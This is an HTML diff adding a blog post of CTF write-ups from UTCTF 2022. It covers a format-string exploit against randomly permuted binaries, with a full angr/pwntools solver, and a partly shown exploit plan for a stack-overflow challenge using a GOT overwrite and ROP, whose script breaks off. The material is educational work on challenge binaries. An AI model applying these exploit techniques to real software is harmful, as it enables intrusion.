@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>UTCTF 2022</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/utctf-2022/#automatic-exploit-generation-2">Automatic Exploit Generation 2</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/utctf-2022/#smol-overflow">Smol Overflow</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/utctf-2022/#bloat">Bloat</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>UTCTF 2022</h1>
+    </header>
+
+    <div class="content">
+        <p>I competed with the Texas A&amp;M Cyber Club; placing in 23rd place.</p>
+<span id="continue-reading"></span><h1 id="automatic-exploit-generation-2"><a href="/utctf-2022/aeg">Automatic Exploit Generation 2</a></h1>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>Now with printf!
+</span><span>
+</span><span>By Tristan (@trab on discord)
+</span><span>nc pwn.utctf.live 5002
+</span></code></pre>
+<p><a href="/utctf-2022/bins/aeg1">binary 1</a></p>
+<p><img src="/uctf-2022/angr_simp.png" alt="" /></p>
+<p>I really like automatic exploit generation. I did the one in last year's UTCTF and in general they are some of my favorite challenges. So of course as soon as I heard there was one here I went straight for it.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯  nc pwn.utctf.live 5002
+</span><span>You will be given 10 randomly generated binaries.
+</span><span>You have 60 seconds to solve each one.
+</span><span>Solve the binary by making it exit with the given exit code
+</span><span>Press enter when you&#39;re ready for the first binary.
+</span><span>...xxd blob
+</span><span>
+</span><span>Binary should exit with code 230
+</span></code></pre>
+<p>The first step is to scope out the provided binary. What's the general sort of attack we're doing, how do different binaries differ, etc.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">long</span><span> lVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 </span><span style="color:#f29e74;">*</span><span>puVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_218</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_210</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_208 [</span><span style="color:#ffcc66;">63</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(undefined8 </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_218 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_210 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  puVar2 </span><span style="color:#f29e74;">=</span><span> local_208</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">for </span><span>(lVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x3e</span><span style="color:#ccc9c2cc;">;</span><span> lVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;</span><span> lVar1 </span><span style="color:#f29e74;">=</span><span> lVar1 </span><span style="color:#f29e74;">+ -</span><span style="color:#ffcc66;">1</span><span>) {
+</span><span>    </span><span style="color:#f29e74;">*</span><span>puVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    puVar2 </span><span style="color:#f29e74;">=</span><span> puVar2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#f29e74;">*</span><span>(undefined2 </span><span style="color:#f29e74;">*</span><span>)puVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">fgets</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>local_218</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x202</span><span style="color:#ccc9c2cc;">,</span><span>stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">permute</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>local_218)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>local_218)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#f28779;">exit</span><span>(exit_code)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>It's a pretty clear format string vulnerability and it exits using a global variable "exit_code" as an argument.</p>
+<p><img src="/utctf-2022/aeg_checksec.png" alt="checksec of an aeg binary; no PIE" /></p>
+<p>There isn't even PIE, so with stack control and a format string vulnerability it should be pretty straightforward to use %n to write whatever we want to exit_code.</p>
+<p>Unfortunately...</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>void permute(undefined8 param_1)
+</span><span>
+</span><span>{
+</span><span>  permute5(param_1);
+</span><span>  permute3(param_1);
+</span><span>  permute6(param_1);
+</span><span>  permute1(param_1);
+</span><span>  permute4(param_1);
+</span><span>  permute7(param_1);
+</span><span>  permute2(param_1);
+</span><span>  permute8(param_1);
+</span><span>  return;
+</span><span>}
+</span></code></pre>
+<p>Any input we provide gets shuffled up so what gets passed to printf is completely different than what gets provided via stdin. A quick check of a new binary shows that this all gets shuffled about when a new binary is generated. How do we resolve this?</p>
+<p>Well I hate work so I just used angr to magic up a solution lol. All you need to do to solve this is make a format string payload, explore to find a state at the printf invocation, apply some constraints on memory, and then boom you can just ask for the stdin that fits those constraints. It's really quite disgusting that it's this easy.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>angr</span><span style="color:#ccc9c2cc;">, </span><span>argparse
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>claripy </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">from </span><span>subprocess </span><span style="color:#ffa759;">import </span><span>check_output
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;pwn.utctf.live&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">5002</span><span>)
+</span><span>
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>()
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;binary.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">10</span><span>):
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;trying round </span><span>{i}</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;tmp.xxd&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;wb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
+</span><span>        f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>))
+</span><span>    os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">system</span><span>(</span><span style="color:#bae67e;">&quot;xxd -rp tmp.xxd &gt; binary.tmp&quot;</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;Binary should exit with code &quot;</span><span>)
+</span><span>    exit_code </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">rstrip</span><span>())
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;attempting to call exit(</span><span>{exit_code}</span><span style="color:#bae67e;">)&quot;</span><span>)
+</span><span>    exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./binary.tmp&quot;</span><span>)
+</span><span>    p </span><span style="color:#f29e74;">= </span><span>angr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Project</span><span>(</span><span style="color:#bae67e;">&quot;./binary.tmp&quot;</span><span>)
+</span><span>
+</span><span>    state </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">blank_state</span><span>()
+</span><span>    simgr </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">simgr</span><span>(state</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">save_unconstrained</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
+</span><span>
+</span><span>
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># lmao this is genuinely disgusting
+</span><span>    printf_caller_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(</span><span style="color:#ffd580;">check_output</span><span>(</span><span style="color:#bae67e;">&quot;objdump -Mintel -D ./binary.tmp | rg </span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">call.*?printf@plt</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">shell</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">lstrip</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot;:&quot;</span><span>)[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">16</span><span>)
+</span><span>
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span>{exit_code}</span><span style="color:#bae67e;">c%10$n</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;
+</span><span>    simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">explore</span><span>(</span><span style="color:#ffcc66;">find</span><span style="color:#f29e74;">=</span><span>printf_caller_addr)
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span>simgr</span><span style="color:#f29e74;">.</span><span>found:
+</span><span>        i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(i</span><span style="color:#f29e74;">.</span><span>memory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">load</span><span>(i</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>rdi</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f28779;">len</span><span>(payload)) </span><span style="color:#f29e74;">== </span><span>payload)
+</span><span>        i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(i</span><span style="color:#f29e74;">.</span><span>memory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">load</span><span>(i</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>rdi</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">8</span><span>) </span><span style="color:#f29e74;">== </span><span style="color:#ffd580;">p64</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;exit_code&#39;</span><span>]))
+</span><span>        </span><span style="color:#ffa759;">if </span><span>i</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>():
+</span><span>            log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;sat!&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">else</span><span>:
+</span><span>            log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">error</span><span>(</span><span style="color:#bae67e;">&quot;oop not sat :(&quot;</span><span>)
+</span><span>            </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(i</span><span style="color:#f29e74;">.</span><span>posix</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(</span><span style="color:#ffcc66;">0</span><span>))
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{exit_code}</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span></code></pre>
+<p>I went to run it on the server... only to find that it took too long. Averaged something like 80 seconds on my laptop and the server times out at 60 seconds per binary. I was a little scared that I wouldn't be able to get it fast enough to solve but a little investigation found the tip "Use pypy.  pypy is an alternate python interpreter that performs optimized jitting of python code." I tried running it with pypy and sure enough it cut my average execution time to 40 seconds, comfortably fast enough to solve it.</p>
+<p>utflag{you_mix_me_right_round_baby_right_round135799835}</p>
+<h1 id="smol-overflow"><a href="/utctf-2022/smol">Smol Overflow</a></h1>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>You can have a little overflow, as a treat
+</span><span>
+</span><span>By Tristan (@trab on discord)
+</span><span>nc pwn.utctf.live 5004 
+</span></code></pre>
+<p><a href="/utctf-2022/bins/smol">smol</a></p>
+<p><img src="/utctf-2022/smol_checksec.png" alt="checksec of smol; no PIE but it has a canary" /></p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>
+</span><span>undefined8 </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">char</span><span> cVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  ulong uVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>pcVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> in_FS_OFFSET</span><span style="color:#ccc9c2cc;">;
+</span><span>  byte bVar5</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_158 [</span><span style="color:#ffcc66;">111</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined4 uStack233</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined2 uStack229</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_78 [</span><span style="color:#ffcc66;">104</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  bVar5 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_10 </span><span style="color:#f29e74;">= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;What kind of data do you have?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">gets</span><span>(local_158)</span><span style="color:#ccc9c2cc;">;
+</span><span>  iVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>(local_158</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;big data&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(iVar2 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    uVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xffffffffffffffff</span><span style="color:#ccc9c2cc;">;
+</span><span>    pcVar4 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">do </span><span>{
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(uVar3 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>      uVar3 </span><span style="color:#f29e74;">=</span><span> uVar3 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      cVar1 </span><span style="color:#f29e74;">= *</span><span>pcVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar4 </span><span style="color:#f29e74;">=</span><span> pcVar4 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar5 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    } </span><span style="color:#ffa759;">while </span><span>(cVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x30322025</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f29e74;">*</span><span>(undefined2 </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack229 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x73</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">else </span><span>{
+</span><span>    iVar2 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>(local_158</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;smol data&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(iVar2 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>      uVar3 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0xffffffffffffffff</span><span style="color:#ccc9c2cc;">;
+</span><span>      pcVar4 </span><span style="color:#f29e74;">= </span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffa759;">do </span><span>{
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(uVar3 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>        uVar3 </span><span style="color:#f29e74;">=</span><span> uVar3 </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>        cVar1 </span><span style="color:#f29e74;">= *</span><span>pcVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>        pcVar4 </span><span style="color:#f29e74;">=</span><span> pcVar4 </span><span style="color:#f29e74;">+ </span><span>(ulong)bVar5 </span><span style="color:#f29e74;">* -</span><span style="color:#ffcc66;">2 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      } </span><span style="color:#ffa759;">while </span><span>(cVar1 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&#39;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x73352025</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#f29e74;">*</span><span>(undefined </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack229 </span><span style="color:#f29e74;">+ ~</span><span>uVar3) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#ffa759;">else </span><span>{
+</span><span>      </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Error&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Give me your data&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">gets</span><span>(local_78)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)((</span><span style="color:#ffa759;">long</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>uStack233 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span>local_78)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">putchar</span><span>(</span><span style="color:#ffcc66;">10</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">!= *</span><span>(</span><span style="color:#ffa759;">long </span><span style="color:#f29e74;">*</span><span>)(in_FS_OFFSET </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x28</span><span>)) {
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#ffd580;">__stack_chk_fail</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>The big takeaway I get from this is that it's vulnerable as fuck. Multiple gets calls, and a sus printf. A naive overflow can't exploit this because of the canary but we also have a printf which uses a stack string as the format string. This is unimaginably suspicious to me because honestly no good reason why it shouldn't be an unwritable constant string. A little investigation on how it gets populated (in two conditional blocks, branched based on strcmp) shows that if neither of those strcmp calls match then the stack string is uninitialized.</p>
+<p>At this point the general structure of the attack is clear</p>
+<ol>
+<li>Overflow the "what kind of data" prompt to fill the stack string with whatever we want and not match either big or smol data.</li>
+<li>Rewrite the GOT entry for <code>__stack_chk_fail</code> to a ret gadget</li>
+<li>ROP to get_flag.</li>
+</ol>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">##!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./smol_patched&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>        </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>            gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">attach</span><span>(r)
